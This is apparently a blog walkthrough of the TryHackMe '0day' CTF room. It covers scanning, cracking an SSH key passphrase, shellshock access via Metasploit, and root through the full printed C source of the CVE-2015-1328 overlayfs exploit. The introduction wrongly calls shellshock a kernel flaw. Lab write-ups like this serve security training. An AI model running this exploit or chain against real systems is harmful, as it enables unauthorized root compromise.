---
title: "0day CTF"
datePublished: Fri Aug 04 2023 06:32:40 GMT+0000 (Coordinated Universal Time)
cuid: clkw7l9qc000d0al9a379dmrt
slug: 0day-ctf
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1691592844036/11fde97c-5ca4-47df-85b7-fd6eb9cf5747.png
tags: ctf, penetration-testing, 2articles1week, tryhackme, ctf-writeup

---

This walkthrough will go over the [0day](https://tryhackme.com/room/0day) CTF found on [TryHackMe](https://tryhackme.com). You will be introduced to the shellshock vulnerability that exists in Linux Kernels 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04).

### Step 1: Nmap

```bash
nmap -T4 -sC -sV -sS 10.10.73.9 --min-rate 1000
```

```plaintext
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 20:02 MDT
Nmap scan report for 10.10.73.9
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Step 2: Enumerate

```bash
gobuster dir --url http://10.10.73.9/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 100 -q
```

```plaintext
/.htaccess            (Status: 403) [Size: 286]
/.hta                 (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 286]
/admin                (Status: 301) [Size: 307] [--> http://10.10.73.9/admin/]
/backup               (Status: 301) [Size: 308] [--> http://10.10.73.9/backup/]
/cgi-bin/             (Status: 403) [Size: 285]
/cgi-bin              (Status: 301) [Size: 309] [--> http://10.10.73.9/cgi-bin/]
/css                  (Status: 301) [Size: 305] [--> http://10.10.73.9/css/]
/img                  (Status: 301) [Size: 305] [--> http://10.10.73.9/img/]
/index.html           (Status: 200) [Size: 3025]
/js                   (Status: 301) [Size: 304] [--> http://10.10.73.9/js/]
/robots.txt           (Status: 200) [Size: 38]
/secret               (Status: 301) [Size: 308] [--> http://10.10.73.9/secret/]
/server-status        (Status: 403) [Size: 290]
/uploads              (Status: 301) [Size: 309] [--> http://10.10.73.9/uploads/]
```

We're also going to fire up a `Nikto` scan. This can take some time, so in the meantime, we will enumerate these directories.

```plaintext
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

Digging through `/backup`, we discover an SSH key. Let's see if we can crack the passphrase.

```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

We cracked the passphrase; however, we were unsuccessful in logging in.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691130493475/9cc55ee4-8cee-4ab1-b9e6-dfd3a3ff97db.png align="center")

However, the `Nikto` scan did give us a better result, presenting an attack vector and allowing us to gain our initial foothold.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691130506757/2ffc54d0-ea6b-49dc-a41b-94467f871fbe.png align="center")

### Step 3: Initial Foothold

Looks like this box is vulnerable to `shellshock`, which essentially causes the bash shell to run commands from environment variables unintentionally. Fortunately for us, there is a Metasploit module for this called `apache_mod_cgi_bash_env_exec`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691130530225/61069132-5427-411d-be6e-73cbfc691595.png align="center")

Configure and run it.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691130540175/a983307a-ab96-4e24-ac8d-fa6d482c04fd.png align="center")

Keep in mind that the `TARGETURI` of `/cgi-bin/test.cgi` was identified in our `Nikto` scan. Now that we have a meterpreter session, let's drop into a shell and look for our first flag. But first, let's make this shell better:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691130560215/7e80b5a9-8705-47e6-8a65-0e91abec7079.jpeg align="center")

### Step 4: linPEAS

Now on to elevating privileges to get the root flag. We'll enumerate using `linPEAS`.

Start python server:

```bash
python3 -m http.server 8000
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691130586704/f1949b67-1de1-4ded-a3e8-9437915c2d52.png align="center")

Upload binary, set permissions, and run.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691130595584/3ae31ca2-1211-4e6a-8820-87b153ff9fae.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691130600528/595d72ef-4b04-4817-96ca-8e5779ea813a.png align="center")

Oof, the Linux version has a vulnerability with `overlayfs` improperly handling permissions and can be exploited to elevate privileges.

### Step 5: Privesc and Root

Exploit (Source: [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)):

```c
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
user@ubuntu-server-1504:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)

greets to beist & kaliman
2015-05-24
%rebel%
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>

#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"

static char child_stack[1024*1024];

static int
child_exec(void *stuff)
{
    char *file;
    system("rm -rf /tmp/ns_sploit");
    mkdir("/tmp/ns_sploit", 0777);
    mkdir("/tmp/ns_sploit/work", 0777);
    mkdir("/tmp/ns_sploit/upper",0777);
    mkdir("/tmp/ns_sploit/o",0777);

    fprintf(stderr,"mount #1\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");

    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }

    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
}

int
main(int argc, char **argv)
{
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;

    fprintf(stderr,"spawning threads\n");

    if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return 0;
    }

    usleep(300000);

    wait(NULL);

    fprintf(stderr,"child threads done\n");

    fd = open("/etc/ld.so.preload",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"exploit failed\n");
        exit(-1);
    }

    fprintf(stderr,"/etc/ld.so.preload created\n");
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    execl("/bin/su","su",NULL);
}
```

Let's go ahead and save this and upload it to the box.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691130670050/fbae3739-464d-4bfa-9393-aa4f873482b4.png align="center")

Now let's prepare it and get that tasty root flag.

```bash
gcc exploit.c -o exploit
./exploit
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691130689345/a164e9e4-beef-4d92-a2b9-1a8e9db829b1.jpeg align="center")

I hope you enjoyed this walkthrough of the [0day](https://tryhackme.com/room/0day) CTF found on [TryHackMe](https://tryhackme.com). Happy Hacking!